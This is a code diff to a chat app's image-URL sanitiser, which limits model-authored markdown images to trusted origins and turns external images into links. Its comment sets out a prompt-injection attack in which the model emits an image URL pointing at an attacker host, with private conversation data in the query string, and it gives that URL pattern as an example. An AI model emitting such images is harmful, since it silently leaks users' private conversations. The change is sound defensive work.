@@ -23,26 +23,62 @@ import { normalise, safeUrl } from "@v1/backend/convex/urlGuard";
 export { safeUrl };
 
 /**
- * Images are stricter than links: https only.
+ * Images are stricter than links, and stricter still than they used to be.
  *
- * data: is refused even for images, because data:image/svg+xml can carry
- * script and an <img> is not a safe container for arbitrary SVG.
+ * PROMPT-INJECTION EXFILTRATION. Model output is markdown, so the model cannot
+ * make the browser run script or fetch() — but `![](https://attacker/?d=…)`
+ * auto-loads an image, and the query string carries whatever an injection made
+ * the model encode about the user's private conversation. Allowing any https
+ * host (the old behaviour) made that a working exfiltration channel.
  *
- * Stays in the app: it resolves against NEXT_PUBLIC_CONVEX_URL, which only
- * exists in the browser bundle.
+ * So a model-authored image may only point at somewhere the app already trusts:
+ * its OWN origin, the Convex storage origin (where attachment/artifact/avatar
+ * images live), or an inline data:image/blob:. An external image URL returns ""
+ * here and the renderer shows it as a LINK instead — visible, clickable, but not
+ * auto-fetched, so viewing it becomes a deliberate user action rather than a
+ * silent request. A browser-level CSP `img-src` (next.config.mjs) enforces the
+ * same boundary even if this filter is ever bypassed.
+ *
+ * data:image is now ALLOWED (a legitimate inline chart/thumbnail) — SVG is the
+ * only worry there, and an <img>'s SVG cannot execute script or make requests,
+ * so it is not an exfil or XSS vector the way a navigated SVG document is.
  */
 export function safeImageUrl(url: string): string {
   if (!url) return "";
   const cleaned = normalise(url);
   if (!cleaned) return "";
-  try {
-    const convex = process.env.NEXT_PUBLIC_CONVEX_URL;
-    const u = new URL(cleaned, convex || "https://relative.invalid");
-    if (u.protocol === "https:") return cleaned;
-    // The self-hosted Convex storage origin is http in some deployments.
-    if (convex && cleaned.startsWith(convex)) return cleaned;
-    return "";
-  } catch {
-    return "";
+  const lower = cleaned.toLowerCase();
+  // Inline images are same-document — no network request leaves the page.
+  if (lower.startsWith("data:image/") || lower.startsWith("blob:")) {
+    return cleaned;
   }
+  // A RELATIVE url (no scheme/authority of its own) is same-origin by
+  // construction — `new URL` with no base throws on it — so it needs no origin
+  // comparison and no `window`. That is the common case (a Convex storage path,
+  // an app asset) and it is always allowed once the scheme checks above passed.
+  let absolute: URL;
+  try {
+    absolute = new URL(cleaned);
+  } catch {
+    return cleaned; // relative → same-origin
+  }
+  // An ABSOLUTE url is trusted only if its origin is the app's own or Convex's.
+  const trusted = new Set();
+  if (typeof window !== "undefined") trusted.add(window.location.origin);
+  const convex = process.env.NEXT_PUBLIC_CONVEX_URL;
+  if (convex) {
+    try {
+      trusted.add(new URL(convex).origin);
+    } catch {
+      // ignore a malformed build-time value
+    }
+  }
+  return trusted.has(absolute.origin) ? cleaned : "";
+}
+
+/** True when a rejected image URL is nonetheless a safe LINK target (http/https),
+ *  so the renderer can offer it as a click-through instead of dropping it. */
+export function isLinkableImage(url: string): boolean {
+  const safe = safeUrl(url);
+  return !!safe && /^https?:/i.test(safe);
 }
